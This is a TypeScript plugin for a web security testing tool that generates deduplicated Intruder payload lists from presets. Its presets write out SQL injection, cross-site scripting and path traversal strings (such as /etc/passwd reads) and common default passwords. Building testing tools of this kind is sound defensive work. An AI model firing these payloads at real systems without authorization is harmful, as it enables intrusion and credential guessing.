/**
 * Intruder Dictionary Payload Generator
 *
 * @plugin intruder_dictionary_payload_generator
 * @name Intruder Dictionary Payload Generator
 * @version 1.0.0
 * @author Sentinel Team
 * @main_category intruder
 * @category payload_generator
 * @default_severity info
 * @tags intruder, payload, generator, dictionary
 * @description Generate deduplicated Intruder payloads from built-in presets, custom values, and lightweight local mutations.
 */

interface IntruderPosition {
    index?: number;
    name?: string;
    value?: string;
}

interface ToolInput {
    rawRequest?: string;
    positions?: IntruderPosition[];
    config?: {
        preset?: "sqli_basic" | "xss_basic" | "path_traversal" | "auth_common" | "numeric_range" | "custom";
        values?: string[];
        includePositionValues?: boolean;
        prefix?: string;
        suffix?: string;
        caseVariants?: boolean;
        urlEncode?: boolean;
        numberStart?: number;
        numberEnd?: number;
        numberStep?: number;
        limit?: number;
    };
    options?: {
        limit?: number;
    };
}

interface ToolOutput {
    success: boolean;
    data?: {
        payloads: string[];
        summary: {
            preset: string;
            generated: number;
            truncated: boolean;
        };
    };
    error?: string;
}

type PluginGlobals = typeof globalThis & {
    get_input_schema?: typeof get_input_schema;
    get_output_schema?: typeof get_output_schema;
    analyze?: typeof analyze;
};

const pluginGlobals = globalThis as PluginGlobals;

const PRESETS: Record<string, string[]> = {
    sqli_basic: [
        "'",
        "\"",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' AND '1'='2",
        "' UNION SELECT NULL--",
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND SLEEP(5)--",
    ],
    xss_basic: [
        "<script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>",
        "'><svg onload=alert(1)>",
        "javascript:alert(1)",
        "${alert(1)}",
    ],
    path_traversal: [
        "../",
        "../../etc/passwd",
        "../../../etc/passwd",
        "..\\..\\windows\\win.ini",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ],
    auth_common: [
        "admin",
        "administrator",
        "root",
        "test",
        "guest",
        "password",
        "Password123",
        "123456",
        "000000",
    ],
    custom: [],
};

function clampLimit(value: unknown): number {
    const parsed = Number(value);
    if (!Number.isFinite(parsed)) return 100;
    return Math.max(1, Math.min(Math.trunc(parsed), 10000));
}

function uniquePush(values: string[], seen: Set<string>, value: unknown): void {
    const normalized = String(value ?? "").trim();
    if (!normalized || seen.has(normalized)) return;
    seen.add(normalized);
    values.push(normalized);
}

function buildNumericRange(config: NonNullable<ToolInput["config"]>): string[] {
    const start = Number.isFinite(Number(config.numberStart)) ? Math.trunc(Number(config.numberStart)) : 0;
    const end = Number.isFinite(Number(config.numberEnd)) ? Math.trunc(Number(config.numberEnd)) : 100;
    const rawStep = Number.isFinite(Number(config.numberStep)) ? Math.trunc(Number(config.numberStep)) : 1;
    const step = Math.max(1, Math.abs(rawStep));
    const direction = start <= end ? 1 : -1;
    const values: string[] = [];

    for (let current = start; direction > 0 ? current <= end : current >= end; current += step * direction) {
        values.push(String(current));
        if (values.length >= 10000) break;
    }

    return values;
}

function applyMutations(payloads: string[], config: NonNullable<ToolInput["config"]>): string[] {
    const mutated: string[] = [];
    const seen = new Set<string>();
    const prefix = config.prefix || "";
    const suffix = config.suffix || "";

    for (const payload of payloads) {
        const wrapped = `${prefix}${payload}${suffix}`;
        uniquePush(mutated, seen, wrapped);

        if (config.caseVariants) {
            uniquePush(mutated, seen, wrapped.toLowerCase());
            uniquePush(mutated, seen, wrapped.toUpperCase());
        }

        if (config.urlEncode) {
            uniquePush(mutated, seen, encodeURIComponent(wrapped));
        }
    }

    return mutated;
}

function collectPayloads(input: ToolInput): string[] {
    const config = input.config || {};
    const preset = config.preset || "custom";
    const seed: string[] = [];
    const seen = new Set<string>();

    for (const value of config.values || []) {
        uniquePush(seed, seen, value);
    }

    const presetValues = preset === "numeric_range"
        ? buildNumericRange(config)
        : (PRESETS[preset] || PRESETS.custom);
    for (const value of presetValues) {
        uniquePush(seed, seen, value);
    }

    if (config.includePositionValues) {
        for (const position of input.positions || []) {
            uniquePush(seed, seen, position.value);
        }
    }

    return applyMutations(seed, config);
}

export function get_input_schema() {
    return {
        type: "object",
        properties: {
            config: {
                type: "object",
                properties: {
                    preset: {
                        type: "string",
                        enum: ["sqli_basic", "xss_basic", "path_traversal", "auth_common", "numeric_range", "custom"],
                        default: "custom",
                        description: "Built-in payload preset to include",
                    },
                    values: {
                        type: "array",
                        items: { type: "string" },
                        description: "Custom payload values",
                    },
                    includePositionValues: {
                        type: "boolean",
                        default: false,
                        description: "Include original Intruder position values",
                    },
                    prefix: { type: "string", description: "Prefix added to each payload" },
                    suffix: { type: "string", description: "Suffix added to each payload" },
                    caseVariants: {
                        type: "boolean",
                        default: false,
                        description: "Add upper/lower-case variants",
                    },
                    urlEncode: {
                        type: "boolean",
                        default: false,
                        description: "Add URL-encoded variants",
                    },
                    numberStart: { type: "integer", default: 0 },
                    numberEnd: { type: "integer", default: 100 },
                    numberStep: { type: "integer", default: 1 },
                    limit: {
                        type: "integer",
                        default: 100,
                        minimum: 1,
                        maximum: 10000,
                        description: "Maximum payloads to return",
                    },
                },
            },
        },
    };
}

export function get_output_schema() {
    return {
        type: "object",
        properties: {
            success: { type: "boolean" },
            data: {
                type: "object",
                properties: {
                    payloads: {
                        type: "array",
                        items: { type: "string" },
                    },
                    summary: { type: "object" },
                },
            },
            error: { type: "string" },
        },
    };
}

export async function analyze(input: ToolInput): Promise<ToolOutput> {
    try {
        const config = input?.config || {};
        const payloads = collectPayloads(input || {});
        const limit = clampLimit(config.limit ?? input?.options?.limit);
        const sliced = payloads.slice(0, limit);

        return {
            success: true,
            data: {
                payloads: sliced,
                summary: {
                    preset: config.preset || "custom",
                    generated: sliced.length,
                    truncated: payloads.length > sliced.length,
                },
            },
        };
    } catch (error) {
        return {
            success: false,
            error: error instanceof Error ? error.message : String(error),
        };
    }
}

pluginGlobals.get_input_schema = get_input_schema;
pluginGlobals.get_output_schema = get_output_schema;
pluginGlobals.analyze = analyze;
